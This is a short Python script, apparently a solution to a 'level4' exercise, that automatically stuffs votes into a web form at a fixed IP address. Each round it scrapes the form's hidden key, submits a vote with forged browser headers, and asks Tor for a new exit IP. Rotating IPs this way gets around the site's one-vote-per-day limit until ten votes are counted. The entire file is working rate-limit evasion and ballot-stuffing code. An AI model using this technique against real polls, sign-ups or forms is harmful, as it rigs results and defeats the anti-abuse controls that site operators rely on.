import requests
import time
from stem import Signal
from stem.control import Controller
from bs4 import BeautifulSoup


URL = "http://158.69.76.135/level4.php"

payload = {"id": "1", "holdthedoor": "Submit+Query", "key": ""}
headers = {
    "Host": "158.69.76.135",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
    "Accept": "text/html, application/xhtml+xml, application/xml",
    "Accept-Language": "en-US, en",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "74",
    "Origin": "http://158.69.76.135",
    "Connection": "keep-alive",
    "Referer": "http://158.69.76.135/level4.php"
}


def get_current_ip():

    # TO Request URL with SOCKS over TOR
    session.proxies = {}
    session.proxies['http'] = 'socks5h://localhost:9050'
    session.proxies['https'] = 'socks5h://localhost:9050'

    try:
        r = session.get('http://httpbin.org/ip')
    except Exception as e:
        print(e)
    else:
        return r.text


def renew_tor_ip():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password="VoteUP")
        controller.signal(Signal.NEWNYM)

votes = 0
while votes < 10:
    session = requests.session()
    print(get_current_ip())
    response = session.get(URL)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, "html.parser")
        key = soup.find("input", {'name': "key"}).attrs['value']
        payload["key"] = key
        print("[GET]: The request has succeeded, key = {:s}.".format(key))
    else:
        print("[GET]: The request has fail : {:s}.".format(URL))
    response = session.post(URL, data=payload, headers=headers)
    if response.status_code == 200:
        print("{:d} The request has succeeded.".format(votes))
    else:
        print("{:d} The request has fail.".format(votes))
    if response.text != "You already voted today [12]":
        votes += 1
    else:
        print("{:d} vote fail.".format(votes))
        continue
    renew_tor_ip()
    time.sleep(5)
